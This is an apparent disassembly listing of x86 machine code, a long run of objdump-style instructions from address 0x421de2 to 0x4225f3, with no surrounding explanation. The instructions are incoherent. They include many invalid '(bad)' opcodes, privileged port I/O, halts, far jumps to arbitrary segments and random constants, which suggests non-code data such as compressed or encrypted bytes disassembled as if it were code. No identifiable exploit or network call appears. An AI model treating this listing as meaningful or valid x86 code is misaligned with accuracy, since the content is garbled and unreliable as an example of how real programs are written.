  421de2:	push   es
  421de3:	xor    eax,0x530ec91d
  421de8:	dec    edx
  421de9:	ret    0xe95e
  421dec:	push   esp
  421ded:	(bad)  
  421dee:	aas    
  421def:	push   ds
  421df0:	sub    DWORD PTR [edx+0x4760f4c7],edi
  421df6:	jge    0x421e18
  421df8:	ss or  al,0x42
  421dfb:	fcomi  st,st(3)
  421dfd:	dec    esp
  421dfe:	pop    edx
  421dff:	je     0x421d9b
  421e01:	pop    ecx
  421e02:	test   BYTE PTR [eax+0x4f97d4a4],ch
  421e08:	stos   DWORD PTR es:[edi],eax
  421e09:	pop    ecx
  421e0a:	xor    ecx,0x81041ec6
  421e10:	pop    ecx
  421e11:	in     al,0x72
  421e13:	mov    DWORD PTR [ebx-0x1d],0x63f7901a
  421e1a:	mov    edi,0x9ea6f3d9
  421e1f:	xchg   esp,eax
  421e20:	(bad)  
  421e21:	in     eax,dx
  421e22:	fsub   DWORD PTR [ebx+0x63]
  421e25:	mov    esi,0xa60da8a4
  421e2a:	int3   
  421e2b:	mov    bl,0xbf
  421e2d:	sbb    al,BYTE PTR [esi+0x73eaa1ca]
  421e33:	cmp    edx,DWORD PTR [edx+ebx*4-0x5f]
  421e37:	xchg   edi,eax
  421e38:	cmp    bl,bh
  421e3a:	pop    ecx
  421e3b:	ror    edx,0x2
  421e3e:	loop   0x421dd5
  421e40:	jl     0x421e2f
  421e42:	enter  0xf969,0x20
  421e46:	or     ebx,ebx
  421e48:	imul   esi,DWORD PTR [edx+0x57bfb978],0xffffff80
  421e4f:	dec    edi
  421e50:	pop    ebp
  421e51:	fidiv  WORD PTR [ebx-0x56050cde]
  421e57:	push   edi
  421e58:	inc    esi
  421e59:	retf   0x8dd6
  421e5c:	mov    ds:0x461c2ef7,eax
  421e61:	xor    esi,DWORD PTR [edi]
  421e63:	jge    0x421e95
  421e65:	or     ebp,DWORD PTR [eax]
  421e67:	sbb    eax,0x939f4337
  421e6c:	sbb    BYTE PTR [ebp+0xe3a44d6],dh
  421e72:	test   eax,0x10478f6d
  421e77:	mov    ah,0x8e
  421e79:	aad    0x51
  421e7b:	retf   0x1996
  421e7e:	aam    0xfb
  421e80:	push   ebx
  421e81:	aad    0x2d
  421e83:	ds popf 
  421e85:	mov    edi,0xfb93ad4f
  421e8a:	jo     0x421e82
  421e8c:	outs   dx,DWORD PTR ds:[esi]
  421e8d:	not    eax
  421e8f:	sub    eax,ecx
  421e91:	mov    ch,0x61
  421e93:	shr    BYTE PTR [ebx-0x14],0x1b
  421e97:	fucomi st,st(3)
  421e99:	mov    bh,0xaf
  421e9b:	gs iret 
  421e9d:	mov    ch,0x7a
  421e9f:	and    BYTE PTR [ecx-0x19],bh
  421ea2:	repz fstp st(2)
  421ea5:	mov    ebx,0x5b24293e
  421eaa:	ds mov bh,0x1f
  421ead:	jp     0x421ef2
  421eaf:	cmp    DWORD PTR [ecx-0xce396d4],eax
  421eb5:	sub    eax,0x267ba1f7
  421eba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ebb:	aaa    
  421ebc:	(bad)  
  421ebd:	xor    eax,0x2605b940
  421ec2:	xchg   esp,eax
  421ec3:	hlt    
  421ec4:	sub    bl,BYTE PTR [esi+0x10]
  421ec7:	lea    edx,[eax-0x79]
  421eca:	fwait
  421ecb:	or     bl,BYTE PTR [esi-0x61]
  421ece:	and    eax,0x914ee68a
  421ed3:	sub    esi,ecx
  421ed5:	jnp    0x421e86
  421ed7:	inc    ebx
  421ed8:	jne    0x421ebe
  421eda:	and    ecx,DWORD PTR fs:[esi+edi*2-0x20]
  421edf:	or     bh,BYTE PTR [eax]
  421ee1:	lds    esp,FWORD PTR ds:0xb92cf509
  421ee7:	das    
  421ee8:	inc    eax
  421ee9:	clc    
  421eea:	lods   eax,DWORD PTR ds:[esi]
  421eeb:	mov    al,0x51
  421eed:	inc    edx
  421eee:	push   ds
  421eef:	cmp    ecx,DWORD PTR [eax]
  421ef1:	jp     0x421f4a
  421ef3:	mov    ds:0x832a86da,eax
  421ef8:	repnz adc ecx,DWORD PTR [esp+edi*1+0x18d5be74]
  421f00:	jmp    0x34f9b182
  421f05:	cmp    bh,BYTE PTR [ebp+0x4b562053]
  421f0b:	xchg   ebx,eax
  421f0c:	test   al,0xc2
  421f0e:	adc    eax,0x4b42d2fe
  421f13:	sahf   
  421f14:	test   edx,esp
  421f16:	add    esi,esi
  421f18:	outs   dx,DWORD PTR ds:[esi]
  421f19:	push   0xf3724cf6
  421f1e:	sahf   
  421f1f:	push   edi
  421f20:	popf   
  421f21:	ret    
  421f22:	sbb    DWORD PTR [ecx+esi*1+0x47],ebx
  421f26:	aam    0xc3
  421f28:	jmp    0x519b2892
  421f2d:	xor    BYTE PTR [esi-0x718b8367],ch
  421f33:	adc    dl,dl
  421f35:	call   0x5537:0x2e3ad934
  421f3c:	jmp    0x421f09
  421f3e:	push   0x4d699799
  421f43:	retfw  
  421f45:	int3   
  421f46:	and    esi,DWORD PTR [ecx+0x69]
  421f49:	scas   eax,DWORD PTR es:[edi]
  421f4a:	mov    edx,0x5ac42715
  421f4f:	dec    ecx
  421f50:	mov    edi,ebx
  421f52:	das    
  421f53:	sbb    DWORD PTR [esi-0x7fee141f],eax
  421f59:	dec    eax
  421f5a:	push   ecx
  421f5b:	sub    BYTE PTR [ebx+0x7b],ch
  421f5e:	and    eax,0x83bb1254
  421f63:	fimul  WORD PTR [edi+0x1a0609f5]
  421f69:	push   es
  421f6a:	push   esi
  421f6b:	shl    BYTE PTR [esi-0x5e9b4a5],cl
  421f71:	sub    DWORD PTR [ecx-0x65624dc0],edx
  421f77:	das    
  421f78:	add    esp,eax
  421f7a:	sub    eax,0x5358d9fc
  421f7f:	sub    al,0x19
  421f81:	pop    esi
  421f82:	fdiv   DWORD PTR [edx-0xd]
  421f85:	je     0x421f41
  421f87:	in     eax,0xc7
  421f89:	xchg   esi,eax
  421f8a:	xor    al,BYTE PTR [esi+eax*8+0x1d70da45]
  421f91:	push   ebx
  421f92:	enter  0x4e94,0x2d
  421f96:	jno    0x421f1f
  421f98:	outs   dx,DWORD PTR ds:[esi]
  421f99:	cmp    BYTE PTR [ebp+0x19],ah
  421f9c:	pop    eax
  421f9d:	clc    
  421f9e:	mov    eax,ds:0x958afb76
  421fa3:	jbe    0x422001
  421fa5:	push   cs
  421fa6:	aaa    
  421fa7:	call   0xbc9cc66c
  421fac:	xchg   ecx,eax
  421fad:	mov    esp,0x83af2cd
  421fb2:	xor    ebp,ecx
  421fb4:	les    edx,FWORD PTR [ebx+0x70]
  421fb7:	sub    eax,eax
  421fb9:	pop    ebx
  421fba:	push   cs
  421fbb:	mov    ebx,0x8f70e0c1
  421fc0:	jb     0x422040
  421fc2:	push   ebp
  421fc3:	pop    ds
  421fc4:	sbb    DWORD PTR [esi],edx
  421fc6:	xchg   edx,eax
  421fc7:	imul   esi,DWORD PTR [ebx+edi*1],0x13
  421fcb:	and    eax,0x9b054d70
  421fd0:	push   0xcd883730
  421fd5:	icebp  
  421fd6:	push   esp
  421fd7:	cmp    eax,0x41681c1e
  421fdc:	jge    0x42201f
  421fde:	sub    al,0x61
  421fe0:	pop    ss
  421fe1:	int    0x2e
  421fe3:	or     esp,DWORD PTR [ebp+0x509286ce]
  421fe9:	rcr    edi,cl
  421feb:	aad    0xd7
  421fed:	ror    DWORD PTR [eax+esi*4-0x387b4d18],0x42
  421ff5:	push   ebp
  421ff6:	(bad)  
  421ff7:	into   
  421ff8:	pop    esi
  421ff9:	adc    bl,0x42
  421ffc:	xchg   esi,eax
  421ffd:	cmp    esp,0x21
  422000:	ds push ebx
  422002:	stos   DWORD PTR es:[edi],eax
  422003:	int    0x24
  422005:	mov    esi,DWORD PTR [edi+0x157da722]
  42200b:	jo     0x422079
  42200d:	or     BYTE PTR [ecx+0x7d],bh
  422010:	push   edx
  422011:	mov    al,0xfc
  422013:	mov    eax,ds:0xa124ec1a
  422018:	sub    al,0x64
  42201a:	sub    BYTE PTR [edi+eiz*4+0xb],cl
  42201e:	inc    ebp
  42201f:	into   
  422020:	les    eax,FWORD PTR [ecx-0x6e]
  422023:	imul   ecx,DWORD PTR [esi],0x7c
  422026:	inc    esp
  422027:	xchg   esi,esp
  422029:	jns    0x422091
  42202b:	adc    DWORD PTR [ebp-0x2830af15],0xffffffec
  422032:	pop    ds
  422033:	cmp    eax,DWORD PTR [edx-0x5e]
  422036:	out    dx,eax
  422037:	out    0x26,al
  422039:	push   ebp
  42203a:	pminub mm4,QWORD PTR [ebp-0x53747f15]
  422041:	jne    0x42208e
  422043:	mov    ah,0x9f
  422045:	repz adc ah,BYTE PTR [eax+0x4ea1b760]
  42204c:	mov    ebp,0xb933631c
  422051:	cmp    eax,0x7fea95ff
  422056:	int    0x86
  422058:	inc    ecx
  422059:	jmp    0x422099
  42205b:	pop    ecx
  42205c:	sub    DWORD PTR [ebx-0x60],0x48
  422060:	(bad)  
  422061:	je     0x422096
  422063:	ins    DWORD PTR es:[edi],dx
  422064:	in     al,0x9
  422066:	adc    al,0x2d
  422068:	outs   dx,BYTE PTR ds:[esi]
  422069:	outs   dx,DWORD PTR ds:[esi]
  42206a:	jmp    0x4220e3
  42206c:	js     0x4220c1
  42206e:	(bad)  [ecx]
  422070:	pop    ss
  422071:	jnp    0x42202d
  422073:	lock aas 
  422075:	nop
  422076:	xor    al,0x2a
  422078:	inc    esp
  422079:	ss popf 
  42207b:	mov    ah,0xc5
  42207d:	gs inc ebx
  42207f:	js     0x422021
  422081:	popa   
  422082:	push   esp
  422083:	fwait
  422084:	xchg   edx,eax
  422085:	popa   
  422086:	fild   DWORD PTR ss:[edi+0x48fe2167]
  42208d:	fwait
  42208e:	cmp    al,0x33
  422090:	mov    ah,0xc1
  422092:	lahf   
  422093:	mov    bl,0x8d
  422095:	xor    ebp,DWORD PTR [eax-0x14]
  422098:	inc    ebx
  422099:	jb     0x4220e2
  42209b:	ins    BYTE PTR es:[edi],dx
  42209c:	inc    esi
  42209d:	dec    edx
  42209e:	in     al,0x39
  4220a0:	jmp    0x42208a
  4220a2:	xchg   DWORD PTR [ecx+0x2],eax
  4220a5:	push   ebp
  4220a6:	mov    edi,0x5dd18c46
  4220ab:	fist   DWORD PTR [eax-0x2aa43f4e]
  4220b1:	and    BYTE PTR [eax+0x5c],al
  4220b4:	(bad)  
  4220b6:	add    bh,al
  4220b8:	pop    ds
  4220b9:	nop
  4220ba:	je     0x422133
  4220bc:	jp     0x4220ba
  4220be:	jmp    0x44750c03
  4220c3:	gs repz aaa 
  4220c6:	jae    0x422100
  4220c8:	stc    
  4220c9:	inc    esp
  4220ca:	mov    al,ds:0x914e626
  4220cf:	sbb    al,0xdb
  4220d1:	xchg   ebp,eax
  4220d2:	les    ebx,FWORD PTR [esi+0x69]
  4220d5:	cdq    
  4220d6:	mov    eax,ds:0x4c87c20f
  4220db:	or     DWORD PTR [ebx],0x33d319a3
  4220e1:	repz repnz dec eax
  4220e4:	ins    BYTE PTR es:[edi],dx
  4220e5:	cmovp  esp,DWORD PTR [ebx+eax*8+0x31]
  4220ea:	shr    ch,0x2a
  4220ed:	mov    dh,0x9d
  4220ef:	and    BYTE PTR [edx+ebp*1-0x5e],0x94
  4220f4:	adc    BYTE PTR [edx],0x35
  4220f7:	loop   0x4220f9
  4220f9:	xchg   edi,eax
  4220fa:	dec    edx
  4220fb:	dec    ebp
  4220fc:	leave  
  4220fd:	mov    ebx,0x479ff96b
  422102:	mov    ch,0x37
  422104:	pushf  
  422105:	aam    0xe
  422107:	xor    DWORD PTR [ecx+edx*4],esi
  42210a:	mov    edx,0x4b66c0ca
  42210f:	mov    edx,0x63da2dd5
  422114:	add    esp,DWORD PTR [esp+edx*8+0x3428c7f5]
  42211b:	jge    0x422112
  42211d:	add    al,0x47
  42211f:	fbld   TBYTE PTR [eax+0x1770fd17]
  422125:	mov    cl,0xb1
  422127:	mov    eax,ds:0xb02994e1
  42212c:	sbb    eax,0x6b55eaf5
  422131:	xchg   ecx,eax
  422132:	pop    esp
  422133:	jmp    0x60e4:0xcf158b81
  42213a:	sbb    bh,ah
  42213c:	xchg   ebx,eax
  42213d:	out    dx,eax
  42213e:	pop    ebx
  42213f:	and    DWORD PTR [edx+0x6ff7563e],edi
  422145:	and    BYTE PTR [ebx],dh
  422147:	mov    bl,0xf4
  422149:	inc    ecx
  42214a:	push   eax
  42214b:	rcl    DWORD PTR [edx+0x6f77772],1
  422151:	(bad)  
  422152:	jmp    0x42214f
  422154:	mov    esi,0x130cc18e
  422159:	icebp  
  42215a:	xor    DWORD PTR [ecx],0xa3f77293
  422160:	cs or  eax,0x8cc43e19
  422166:	mov    bl,0xb3
  422168:	les    ecx,FWORD PTR [edi]
  42216a:	fadd   DWORD PTR [edx-0x64]
  42216d:	sar    dh,cl
  42216f:	mov    eax,ds:0x44610a63
  422174:	cdq    
  422175:	add    DWORD PTR [eax],0x75
  422178:	ins    BYTE PTR es:[edi],dx
  422179:	shl    DWORD PTR [edx-0x62],cl
  42217c:	mov    WORD PTR [eax-0x7d],?
  42217f:	pop    edi
  422180:	adc    BYTE PTR [eax],0x6
  422183:	aaa    
  422184:	mov    esi,0xa51e06c9
  422189:	aas    
  42218a:	and    al,0xe4
  42218c:	test   ecx,ebp
  42218e:	lods   eax,DWORD PTR ds:[esi]
  42218f:	ffree  st(5)
  422191:	sub    BYTE PTR [eax-0x4837ef5a],dl
  422197:	jne    0x422175
  422199:	pop    esi
  42219a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42219b:	leave  
  42219c:	inc    edi
  42219d:	mov    WORD PTR [esi+0x1e],?
  4221a0:	retf   0x6187
  4221a3:	pushf  
  4221a4:	jge    0x4221cb
  4221a6:	sbb    BYTE PTR [eax-0x4738c706],0xc
  4221ad:	mov    DWORD PTR [ecx+ecx*1+0x501f4ad],eax
  4221b4:	xchg   BYTE PTR [ebx+eax*4+0x604038da],dl
  4221bb:	out    dx,al
  4221bc:	jmp    0xc38:0xac0a9481
  4221c3:	pop    esp
  4221c4:	rcr    BYTE PTR [eax-0x33a408f],1
  4221ca:	push   esp
  4221cb:	push   edi
  4221cc:	cmp    eax,0xb794be1
  4221d1:	mov    al,ds:0x6ef75d3d
  4221d6:	or     bh,ah
  4221d8:	js     0x42220c
  4221da:	xchg   DWORD PTR [edi-0x3d],esi
  4221dd:	jbe    0x4221bd
  4221df:	loope  0x422199
  4221e1:	std    
  4221e2:	(bad)  
  4221e3:	jnp    0x4221d4
  4221e5:	pop    ebx
  4221e6:	test   eax,0x604c4bef
  4221eb:	mov    ds:0xc4c0192,al
  4221f0:	std    
  4221f1:	xor    eax,0x17d9e06d
  4221f6:	js     0x4221f1
  4221f8:	ror    BYTE PTR [ebp+0x3dc30d7],1
  4221fe:	out    0x27,eax
  422200:	inc    eax
  422201:	pop    ecx
  422202:	stc    
  422203:	jnp    0x422197
  422205:	bound  esi,QWORD PTR [ebx+0x58]
  422208:	sbb    bl,bh
  42220a:	xor    eax,0x95b3eac3
  42220f:	into   
  422210:	cmp    BYTE PTR [ecx],0xfc
  422213:	mov    fs,WORD PTR [edi+edi*4]
  422216:	mov    BYTE PTR [edx],ch
  422218:	cmc    
  422219:	push   edx
  42221a:	jb     0x422200
  42221c:	xor    eax,0xd83c6ed5
  422221:	imul   edx,DWORD PTR [ecx+eiz*4],0x8d92f702
  422228:	test   BYTE PTR [ecx+ebx*4-0xec54c02],bh
  42222f:	pop    ds
  422230:	iret   
  422231:	cmp    eax,0x9ee9731f
  422236:	rol    BYTE PTR [ebx],0x81
  422239:	sbb    DWORD PTR [edi-0x315cdaee],0x1f
  422240:	jnp    0x4222a3
  422242:	arpl   bp,cx
  422244:	add    al,0x2c
  422246:	stos   BYTE PTR es:[edi],al
  422247:	cvttps2pi mm5,QWORD PTR [esi]
  42224a:	jl     0x422286
  42224c:	mov    DWORD PTR [esp+ecx*8],0x194c7d7b
  422253:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422254:	pop    es
  422255:	jno    0x422250
  422257:	or     dl,BYTE PTR [edi-0x64b80f2c]
  42225d:	xor    BYTE PTR [eax],bl
  42225f:	xor    BYTE PTR [ebx-0x1078e42d],ch
  422265:	push   edx
  422266:	rcr    DWORD PTR [ebx],cl
  422268:	pop    ds
  422269:	ins    DWORD PTR es:[edi],dx
  42226a:	repz and DWORD PTR [edx+0x7b6a52cb],ebp
  422271:	(bad)  
  422272:	push   ecx
  422273:	outs   dx,DWORD PTR ds:[esi]
  422274:	fnstcw WORD PTR [edi-0x4b8a9034]
  42227a:	(bad)  
  42227b:	pop    ds
  42227c:	out    0x83,al
  42227e:	adc    DWORD PTR [eax],ebx
  422280:	imul   DWORD PTR [ebp-0x54]
  422283:	sub    BYTE PTR [edx],dh
  422285:	add    bh,BYTE PTR [edx]
  422287:	clc    
  422288:	mov    BYTE PTR [ebp+0x13],cl
  42228b:	jge    0x42224f
  42228d:	and    eax,0xad3f80ef
  422292:	hlt    
  422293:	int    0x5
  422295:	adc    al,0xf1
  422297:	mov    eax,ds:0xd105033c
  42229c:	cs ds sbb edi,esi
  4222a0:	mov    bh,0xee
  4222a2:	cwde   
  4222a3:	inc    ebx
  4222a4:	push   eax
  4222a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222a6:	jno    0x422243
  4222a8:	inc    edi
  4222a9:	push   es
  4222aa:	xchg   esp,eax
  4222ab:	inc    ebp
  4222ac:	sbb    eax,DWORD PTR [ebp-0x7]
  4222af:	and    al,0x91
  4222b1:	mov    esi,0x3155c424
  4222b6:	pop    edx
  4222b7:	in     eax,0x9f
  4222b9:	pushf  
  4222ba:	imul   ebx,DWORD PTR [edx+0x3621eddf],0x35
  4222c1:	push   esp
  4222c2:	int3   
  4222c3:	jbe    0x422341
  4222c5:	cs cld 
  4222c7:	stos   BYTE PTR es:[edi],al
  4222c8:	das    
  4222c9:	addr16 or al,0x9c
  4222cc:	mov    BYTE PTR [ebp+0x20],0x93
  4222d0:	jns    0xac2a6a1
  4222d6:	mov    esp,DWORD PTR [ecx+0x33]
  4222d9:	add    ah,dh
  4222db:	rcr    DWORD PTR [edx-0x5394779],1
  4222e1:	jae    0x422323
  4222e3:	out    0xa9,eax
  4222e5:	push   edx
  4222e6:	das    
  4222e7:	mul    BYTE PTR [eax]
  4222e9:	in     eax,0xee
  4222eb:	out    dx,eax
  4222ec:	cmp    al,0x17
  4222ee:	ficomp WORD PTR [esi+0x53]
  4222f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222f2:	in     al,dx
  4222f3:	sbb    BYTE PTR [ecx-0x1d37e3e8],al
  4222f9:	lock dec edx
  4222fb:	xchg   ecx,eax
  4222fc:	xor    esp,edi
  4222fe:	mov    ebp,0x8645af26
  422303:	loopne 0x42229b
  422305:	fisttp WORD PTR [ebp+0x4fe73cf0]
  42230b:	xchg   DWORD PTR [eax],esp
  42230d:	js     0x422375
  42230f:	cmc    
  422310:	cmc    
  422311:	aas    
  422312:	ror    DWORD PTR [ebx-0x53d968aa],1
  422318:	push   eax
  422319:	mov    cl,0xdf
  42231b:	cmc    
  42231c:	jmp    0x4222ca
  42231e:	and    al,0xfa
  422320:	jnp    0x422368
  422322:	mov    al,0x16
  422324:	adc    BYTE PTR [ecx+0x72d0d39e],bh
  42232a:	dec    eax
  42232b:	fwait
  42232c:	or     al,0x75
  42232e:	pop    esi
  42232f:	rcl    BYTE PTR ds:0x40872e55,0x73
  422336:	xor    DWORD PTR [esi],0x95731157
  42233c:	push   ds
  42233d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42233e:	aad    0x13
  422340:	ret    
  422341:	fdiv   st,st(0)
  422343:	mov    ch,0x86
  422345:	jmp    0xb5a2facb
  42234a:	or     BYTE PTR [ebx-0x51cdf2fc],ah
  422350:	xor    al,0xb1
  422352:	mov    al,BYTE PTR [edx]
  422354:	inc    eax
  422355:	sbb    DWORD PTR [ecx],eax
  422357:	int3   
  422358:	push   0x6d
  42235a:	jns    0x42235a
  42235c:	or     bl,bh
  42235e:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  422360:	pop    es
  422361:	mov    cl,0x17
  422363:	test   dl,dh
  422365:	jmp    0x422316
  422367:	leave  
  422368:	dec    edx
  422369:	mov    ch,0x79
  42236b:	in     eax,dx
  42236c:	ret    
  42236d:	xchg   BYTE PTR [ebx-0x3160ead9],ch
  422373:	xchg   ebp,eax
  422374:	cmc    
  422375:	dec    ebx
  422376:	popa   
  422377:	ror    DWORD PTR [esi+eiz*1-0x5f08a9cf],0x28
  42237f:	rol    DWORD PTR [ebx+0x4745f9ce],1
  422385:	sar    cl,1
  422387:	jmp    0x422321
  422389:	mov    ds:0x73f7d756,al
  42238e:	mov    al,BYTE PTR [ecx]
  422390:	push   eax
  422391:	xchg   esp,eax
  422392:	nop
  422393:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422394:	and    ax,0x161a
  422398:	(bad)  
  422399:	dec    ebp
  42239b:	pop    ebx
  42239c:	xchg   BYTE PTR ds:0x32dc647c,bh
  4223a2:	das    
  4223a3:	mov    ebx,0xda9d0e1
  4223a8:	cmp    edx,DWORD PTR [eax]
  4223aa:	dec    edi
  4223ab:	pop    edi
  4223ac:	jne    0x422377
  4223ae:	mov    dh,al
  4223b0:	mov    ecx,0x88760fa8
  4223b5:	lods   al,BYTE PTR ds:[esi]
  4223b6:	mov    esp,0xd6b05c49
  4223bb:	aas    
  4223bc:	data16 mov ds:0x2fc2b68b,al
  4223c2:	arpl   dx,ax
  4223c4:	rcl    BYTE PTR [esi+ecx*2],cl
  4223c7:	cdq    
  4223c8:	jbe    0x422402
  4223ca:	and    BYTE PTR [eax],0xaa
  4223cd:	cdq    
  4223ce:	(bad)  
  4223d0:	ret    0xcc9e
  4223d3:	inc    bl
  4223d5:	mov    eax,ds:0x96a62866
  4223da:	repz shl ch,0xd1
  4223de:	in     al,dx
  4223df:	mov    eax,ds:0xdf3f185
  4223e4:	and    al,0x6b
  4223e6:	sub    eax,0x6022f9e2
  4223eb:	in     eax,dx
  4223ec:	pop    ecx
  4223ed:	imul   eax,esi,0x38
  4223f0:	inc    esp
  4223f1:	test   al,0xeb
  4223f3:	rcr    BYTE PTR [eax-0x58fe53a9],0x1f
  4223fa:	adc    DWORD PTR [eax],0xeb7ec373
  422400:	sub    ah,BYTE PTR [esi]
  422402:	aad    0x95
  422404:	push   ebx
  422405:	cmp    BYTE PTR [eax+0x47],cl
  422408:	arpl   WORD PTR [ebx+0x106d8a35],cx
  42240e:	jp     0x422424
  422410:	pop    esp
  422411:	jns    0x4223c8
  422413:	hlt    
  422414:	xor    eax,0xaf537e4a
  422419:	int    0xa5
  42241b:	jge    0x4223c2
  42241d:	and    dl,ah
  42241f:	loope  0x422494
  422421:	xor    DWORD PTR [edi],edi
  422423:	(bad)  
  422424:	cld    
  422425:	mov    bh,0x5c
  422427:	push   edi
  422428:	test   al,0xe9
  42242a:	ret    0x2a76
  42242d:	(bad)  
  42242e:	xor    BYTE PTR [edi-0x7ba5c564],ah
  422434:	xchg   ecx,eax
  422435:	test   al,0x8
  422437:	sub    ecx,DWORD PTR [esi+0x11030bfd]
  42243d:	lods   al,BYTE PTR ds:[esi]
  42243e:	inc    ebp
  42243f:	dec    edx
  422440:	je     0x4223ee
  422442:	test   BYTE PTR [edx+0x6c],0xe3
  422446:	popf   
  422447:	dec    ebp
  422448:	add    eax,0x6eed80e9
  42244d:	shr    DWORD PTR [ecx+0x72],1
  422450:	loope  0x422429
  422452:	rcl    BYTE PTR [edi],1
  422454:	dec    ecx
  422455:	push   edi
  422456:	and    eax,0x1a9edd43
  42245b:	stos   BYTE PTR es:[edi],al
  42245c:	shr    DWORD PTR [edx+edi*4],cl
  42245f:	mov    ebx,0x83a5cbdb
  422464:	out    dx,al
  422465:	cli    
  422466:	in     al,dx
  422467:	test   DWORD PTR [edi+edi*4],edi
  42246a:	test   eax,0x74f0301f
  42246f:	mov    edx,0xf0f519c0
  422474:	mov    BYTE PTR [ecx-0x3bfcaae4],bl
  42247a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42247b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42247c:	cmp    eax,0x8bab4857
  422481:	mov    ecx,0x3177c357
  422486:	call   0xa426:0xceb9c6da
  42248d:	push   cs
  42248e:	ss push ebp
  422490:	inc    esp
  422491:	shl    BYTE PTR [ecx+eiz*8],0xd1
  422495:	cmp    esp,DWORD PTR [esi-0x6]
  422498:	shl    BYTE PTR ds:0xf9c510f9,0xe3
  42249f:	jmp    FWORD PTR [edx]
  4224a1:	jbe    0x4224d0
  4224a3:	test   BYTE PTR [ebx],ch
  4224a5:	popf   
  4224a6:	jns    0x42247c
  4224a8:	cmp    eax,0x1c5d5f81
  4224ad:	mov    ds:0x6beaad4e,eax
  4224b2:	and    al,0x86
  4224b4:	iret   
  4224b5:	popf   
  4224b6:	cmp    eax,0xbfd500b1
  4224bb:	hlt    
  4224bc:	iret   
  4224bd:	xor    ch,ch
  4224bf:	lods   eax,DWORD PTR ds:[esi]
  4224c0:	pushf  
  4224c1:	or     esi,DWORD PTR [esi-0x56cac734]
  4224c7:	cmp    BYTE PTR [ecx-0x7d],dh
  4224ca:	je     0x4224f2
  4224cc:	jbe    0x422465
  4224ce:	mov    cl,BYTE PTR [ecx-0x365749c9]
  4224d4:	inc    esi
  4224d5:	aad    0xef
  4224d7:	data16 ja 0x42245a
  4224da:	sub    BYTE PTR [esi+0x2e8e90f9],bh
  4224e0:	jle    0x4224b9
  4224e2:	aas    
  4224e3:	imul   esp,DWORD PTR ds:0x6ac1cb57,0x65aa787b
  4224ed:	inc    ecx
  4224ee:	out    dx,eax
  4224ef:	mov    ecx,0x5b9989ef
  4224f4:	mov    eax,0x59fc387e
  4224f9:	mov    cl,0x85
  4224fb:	aam    0xe
  4224fd:	mov    fs,WORD PTR [ecx]
  4224ff:	xchg   edi,eax
  422500:	or     BYTE PTR [ebx],ah
  422502:	ja     0x422564
  422504:	sub    dh,BYTE PTR [esi+0x46]
  422507:	inc    ecx
  422508:	data16 fwait
  42250a:	neg    DWORD PTR [edi-0x76]
  42250d:	(bad)  
  42250e:	(bad)  
  42250f:	push   ebx
  422510:	push   eax
  422511:	cmp    BYTE PTR [esi-0x532fa5b2],bh
  422517:	lahf   
  422518:	jg     0x4224e4
  42251a:	mov    bl,0xc4
  42251c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42251d:	push   ss
  42251e:	mov    eax,ds:0x516ff0a4
  422523:	jnp    0x42256e
  422525:	mov    ds:0xc4dcd579,al
  42252a:	dec    eax
  42252b:	pop    es
  42252c:	jns    0x4224bb
  42252e:	push   0x5aade83d
  422533:	test   eax,0x5ea6b33f
  422538:	mov    dl,0xe3
  42253a:	bound  edi,QWORD PTR [edi+0x5c]
  42253d:	call   DWORD PTR [ebx-0x5ccdc868]
  422543:	ds push es
  422545:	in     eax,dx
  422546:	cmp    BYTE PTR [ebx-0x68139de2],bl
  42254c:	sti    
  42254d:	adc    ebp,ecx
  42254f:	and    BYTE PTR [ebp+0x5a],bh
  422552:	push   esp
  422553:	jg     0x42252f
  422555:	das    
  422556:	popf   
  422557:	dec    edx
  422558:	inc    edx
  422559:	xor    al,0xbc
  42255b:	pop    ecx
  42255c:	leave  
  42255d:	mov    ebp,0x72424be8
  422562:	call   0x3061:0x6c91f770
  422569:	push   ebx
  42256a:	int3   
  42256b:	frstor [esi+0xc]
  42256e:	xchg   esp,eax
  42256f:	pop    es
  422570:	test   esi,ebx
  422572:	cdq    
  422573:	(bad)  
  422574:	jb     0x422526
  422576:	mov    al,BYTE PTR [ebx-0x77ef2b82]
  42257c:	xchg   BYTE PTR [ebx+0x4cc95fe1],ah
  422582:	fisubr DWORD PTR [ecx]
  422584:	xchg   esp,eax
  422585:	cdq    
  422586:	neg    DWORD PTR [ebx+0x60a53ae2]
  42258c:	sbb    esi,DWORD PTR [edi-0x6e2188b3]
  422592:	xchg   esp,eax
  422593:	ficom  DWORD PTR [esi-0x1d]
  422596:	mov    dl,0x6d
  422598:	lahf   
  422599:	jno    0x42260e
  42259b:	jae    0x42261b
  42259d:	inc    esi
  42259e:	mov    ah,0x66
  4225a0:	les    ecx,FWORD PTR [eax*4+0x6cb685d7]
  4225a7:	retf   0xc8e5
  4225aa:	jno    0x42253b
  4225ac:	xor    eax,DWORD PTR [ebx]
  4225ae:	dec    esi
  4225af:	and    ebx,DWORD PTR ss:[eax]
  4225b2:	test   al,0xc7
  4225b4:	ror    BYTE PTR [esi],cl
  4225b6:	ins    BYTE PTR es:[edi],dx
  4225b7:	mov    ebx,0x650b2e51
  4225bc:	lea    eax,[ecx+0x6abae3d8]
  4225c2:	mov    BYTE PTR [edi+esi*4+0x7ae2b0bb],dh
  4225c9:	dec    esi
  4225ca:	cmp    BYTE PTR [ecx+0x35],al
  4225cd:	(bad)  
  4225ce:	mov    ecx,0xe2700eaa
  4225d3:	sar    BYTE PTR [edx+0x2d],cl
  4225d6:	inc    eax
  4225d7:	mov    dl,0xc4
  4225d9:	adc    edi,DWORD PTR [ebp+0x1]
  4225dc:	sub    al,0x2b
  4225de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225df:	shr    BYTE PTR [esp+edx*2],0x53
  4225e3:	lahf   
  4225e4:	xchg   edi,eax
  4225e5:	dec    eax
  4225e6:	mov    cl,0x7c
  4225e8:	ja     0x422600
  4225ea:	call   0xbeb4ff47
  4225ef:	adc    BYTE PTR [eax],0x6b
  4225f2:	out    dx,eax
  4225f3:	dec    edx
